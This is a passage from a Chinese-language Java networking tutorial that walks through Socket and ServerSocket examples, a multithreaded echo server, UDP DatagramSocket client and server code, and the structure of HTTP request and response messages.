class="line">&#125;</span><br></pre></td></tr></table></figure><p>1）建立套接字连接非常简单，只需要一行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(host, port)</span><br></pre></td></tr></table></figure><p>host 为主机名，port 为端口号（23 为默认的 telnet 端口号）。如果无法确定主机的 IP 地址，则抛出 <code>UnknownHostException</code> 异常；如果在创建套接字时发生 IO 错误，则抛出 <code>IOException</code> 异常。</p><p>需要注意的是，套接字在建立的时候，如果远程主机不可访问，这段代码就会阻塞很长时间，直到底层操作系统的限制而抛出异常。所以一般会在套接字建立后设置一个超时时间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(...);</span><br><span class="line">socket.setSoTimeout(<span class="number">10000</span>); <span class="comment">// 单位为毫秒</span></span><br></pre></td></tr></table></figure><p>2）套接字连接成功后，可以通过 <code>java.net.Socket</code> 类的 <code>getInputStream()</code> 方法获取输入流。有了 <code>InputStream</code> 对象后，可以借助文本扫描器类（Scanner）将其中的内容打印出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is, <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (scanner.hasNextLine()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ServerSocket-实例"><a href="#ServerSocket-实例" class="headerlink" title="ServerSocket 实例"></a>ServerSocket 实例</h3><p>接下来，我们模拟一个远程服务，通过 <code>java.net.ServerSocket</code> 实现。代码示例如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8888</span>);</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is)) </span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(os, <span class="string">&quot;gbk&quot;</span>), <span class="literal">true</span>);</span><br><span class="line">    pw.println(<span class="string">&quot;你好啊，欢迎关注「沉默王二」 公众号，回复关键字「2048」 领取程序员进阶必读资料包&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">done</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span> (!done &amp;&amp; scanner.hasNextLine()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        System.out.println(line);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;2048&quot;</span>.equals(line)) &#123;</span><br><span class="line">            done = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1）建立服务器端的套接字也比较简单，只需要指定一个能够独占的端口号就可以了（0~1023 这些端口都已经被系统预留了）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure><p>2）调用 ServerSocket 对象的 <code>accept()</code> 等待客户端套接字的连接请求。一旦监听到客户端的套接字请求，就会返回一个表示连接已建立的 Socket 对象，可以从中获取到输入流和输出流。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line"><span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br></pre></td></tr></table></figure><p>客户端套接字发送的所有信息都会包裹在服务器端套接字的输入流中；而服务器端套接字发送的所有信息都会包裹在客户端套接字的输出流中。</p><p>3）服务器端可以通过以下代码向客户端发送消息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(os, <span class="string">&quot;gbk&quot;</span>), <span class="literal">true</span>);</span><br><span class="line">pw.println(<span class="string">&quot;你好啊，欢迎关注「沉默王二」 公众号，回复关键字「2048」 领取程序员进阶必读资料包&quot;</span>);</span><br></pre></td></tr></table></figure><p>4）服务器端可以通过以下代码读取客户端发送过来的消息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">done</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">while</span> (!done &amp;&amp; scanner.hasNextLine()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">    System.out.println(line);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;2048&quot;</span>.equals(line)) &#123;</span><br><span class="line">        done = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行该服务后，可以通过 <code>telnet localhost 8888</code> 命令连接该远程服务，不出所料，你将会看到以下信息。<br><img src="/2024/11/01/code/javanetwork/image-3.png"></p><h3 id="04、为多个客户端服务"><a href="#04、为多个客户端服务" class="headerlink" title="04、为多个客户端服务"></a>04、为多个客户端服务</h3><p>非常遗憾的是，上面的例子中，服务器端只能为一个客户端服务——这不符合服务器端一对多的要求。<br>优化方案也非常简单（你应该也能想得到）：服务器端接收到客户端的套接字请求时，可以启动一个线程来处理，而主程序继续等待下一个连接。代码示例如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8888</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">              <span class="comment">// 套接字处理程序</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线程内部（<code>run()&#123;&#125;</code> 方法里）用来处理套接字，代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 其他代码省略</span></span><br><span class="line">   <span class="comment">// 向客户端发送消息</span></span><br><span class="line">   <span class="comment">// 读取客户端发送过来的消息</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器端代码优化后重新运行，你就可以通过 telnet 命令测试了。打开一个命令行窗口输入 <code>telnet localhost 8888</code>，再打开一个新的命令行窗口输入 <code>telnet localhost 8888</code>，多个窗口都可以和服务器端进行通信，除非服务器端代码中断运行。</p><h3 id="05、加入多线程"><a href="#05、加入多线程" class="headerlink" title="05、加入多线程"></a>05、加入多线程</h3><p><a href="https://javabetter.cn/thread/wangzhe-thread.html">多线程</a>我们后面会详细讲，这里就主要是写个例子，好让大家感觉更有趣一些，其实也非常简单。</p><p>来看服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MultiThreadedServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server is listening on port &quot;</span> + port);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">            System.out.println(<span class="string">&quot;Client connected&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClientHandler</span>(socket).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClientHandler</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientHandler</span><span class="params">(Socket socket)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.socket = socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">input</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(input));</span><br><span class="line"></span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">output</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(output, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Received: &quot;</span> + line);</span><br><span class="line">                writer.println(<span class="string">&quot;Server: &quot;</span> + line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Client disconnected&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用了一个 ClientHandler 类，该类继承自 Thread 类。这使得每个客户端连接都可以在单独的线程中处理，从而允许服务器同时处理多个客户端连接。当一个新客户端连接到服务器时，服务器会创建一个新的 ClientHandler 对象，并使用 <code>start()</code> 方法启动线程。ClientHandler 类的 <code>run()</code> 方法包含处理客户端请求的逻辑。</p><p>来看客户端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hostname</span> <span class="operator">=</span> <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(hostname, port);</span><br><span class="line">        System.out.println(<span class="string">&quot;Connected to the server&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">input</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(input));</span><br><span class="line"></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">output</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(output, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        writer.println(<span class="string">&quot;Hello, server!&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;Server response: &quot;</span> + response);</span><br><span class="line"></span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="08、DatagramSocket-实例"><a href="#08、DatagramSocket-实例" class="headerlink" title="08、DatagramSocket 实例"></a>08、DatagramSocket 实例</h3><p>DatagramSocket 类是 Java 中实现 UDP 协议的核心类。与基于 TCP 的 Socket 和 ServerSocket 类不同，DatagramSocket 类提供了无连接的通信服务，发送和接收数据包。由于无需建立连接，UDP 通常比 TCP 更快，但可能不如 TCP 可靠。<br>以下是一个简单的 DatagramSocket 示例，展示了如何使用 UDP 协议在客户端和服务器之间发送和接收消息。</p><p>服务器端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(port);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server is listening on port &quot;</span> + port);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buffer, buffer.length);</span><br><span class="line"></span><br><span class="line">        serverSocket.receive(packet);</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(packet.getData(), <span class="number">0</span>, packet.getLength());</span><br><span class="line">        System.out.println(<span class="string">&quot;Received: &quot;</span> + message);</span><br><span class="line"></span><br><span class="line">        serverSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hostname</span> <span class="operator">=</span> <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">address</span> <span class="operator">=</span> InetAddress.getByName(hostname);</span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">clientSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Hello, server!&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] buffer = message.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buffer, buffer.length, address, port);</span><br><span class="line">        clientSocket.send(packet);</span><br><span class="line">        System.out.println(<span class="string">&quot;Message sent&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clientSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，服务器端创建一个 DatagramSocket 对象并监听端口 12345。然后，它创建一个 DatagramPacket 对象，用于存储接收到的数据包。<code>serverSocket.receive(packet)</code> 方法阻塞，直到收到一个数据包。收到数据包后，服务器从数据包中提取并打印消息。<br>客户端首先解析服务器的 IP 地址，然后创建一个 DatagramSocket 对象。接着，客户端创建一个包含要发送消息的 DatagramPacket 对象，并指定目标地址和端口。最后，客户端通过调用 <code>clientSocket.send(packet)</code> 方法发送数据包。</p><h2 id="Java-Socket实现HTTP服务器"><a href="#Java-Socket实现HTTP服务器" class="headerlink" title="Java Socket实现HTTP服务器"></a>Java Socket实现HTTP服务器</h2><h3 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h3><p>ServerSocket 走的是 TCP 协议，HTTP 协议本身是在 TCP 协议之上的一层。</p><p>TCP 是一种面向连接的、可靠的、基于字节流的传输层协议。TCP 在两个网络节点之间提供了一条可靠的通信信道，确保数据在传输过程中不会丢失、重复或乱序。TCP 使用握手过程建立连接，通过确认和重传机制确保数据可靠传输，并使用流量控制和拥塞控制算法来优化网络性能。</p><p>HTTP 是一个用于在 Web 浏览器和 Web 服务器之间传输超文本、图像、视频和其他媒体资源的应用层协议。HTTP 使用请求-响应模型，即客户端（通常是 Web 浏览器）发送请求给服务器，服务器处理请求并返回响应。HTTP 协议定义了一组方法（如 GET、POST、PUT、DELETE 等），用于指定请求的类型和目的。此外，HTTP 协议还定义了一组状态代码（如 200、404、500 等），用于表示响应的结果。</p><p>HTTP 协议依赖于 TCP 协议来传输数据。当 Web 浏览器向 Web 服务器发送 HTTP 请求时，它首先使用 TCP 协议与服务器建立连接。一旦连接建立，HTTP 请求消息会被封装在 TCP 数据包中，然后通过 TCP 信道发送给服务器。服务器收到 TCP 数据包后，解包提取 HTTP 请求消息，处理请求并生成 HTTP 响应消息。最后，HTTP 响应消息被封装在 TCP 数据包中，并通过相同的 TCP 信道发送回客户端。客户端收到 TCP 数据包后，解包提取 HTTP 响应消息并显示给用户。</p><p><img src="/2024/11/01/code/javanetwork/image-4.png"></p><p><strong>请求消息</strong><br>HTTP 请求消息由请求行（Request Line）、请求头（Request Headers）、空行（Empty Line）、请求体（Request Body，可选）几个部分组成。</p><p>①、请求行又包含三个部分，HTTP 方法（例如 GET, POST, PUT, DELETE 等）、请求的目标 URL（通常是相对 URL，但也可以是绝对 URL）、HTTP 版本（例如 HTTP&#x2F;1.1 或 HTTP&#x2F;2），这些部分用空格分隔，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br></pre></td></tr></table></figure><p>②、请求头是一系列以键值对表示的元数据，用于描述请求的附加信息。每个请求头占一行，键和值之间用冒号（:）分隔。请求头包含诸如 Host、User-Agent、Content-Type、Content-Length、Accept 等信息。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host: www.tobebetterjavaer.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br></pre></td></tr></table></figure><p>③、请求头和请求体之间有一个空行，表示请求头的结束。</p><p>④、对于某些 HTTP 方法（例如 POST、PUT 等），还可以在请求消息中包含请求体。请求体用于传输要发送给服务器的数据。请求体的格式和内容取决于 Content-Type 请求头的值。</p><p>例如，当提交 HTML 表单时，请求体可能如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=沉默王二&amp;password=123456</span><br></pre></td></tr></table></figure><p>将这些部分放在一起，就构成了一个完整的 HTTP 请求消息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: Host: www.tobebetterjavaer.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">username=沉默王二&amp;password=123456</span><br></pre></td></tr></table></figure><p>我用一张思维导图来表示下：<br><img src="/2024/11/01/code/javanetwork/image-5.png"></p><p><strong>响应消息</strong><br>一个典型的 HTTP 响应消息由三部分组成：状态行（Status Line）、响应头（Response Headers）、响应体（Response Body）。</p><p><img src="/2024/11/01/code/javanetwork/image-6.png"></p><p>不管是请求消息还是响应消息，都可以划分为三部分</p><ul><li>第一行：状态行</li><li>第二行到第一个空行：header（请求头&#x2F;相应头）</li><li>剩下所有：正文</li></ul><h3 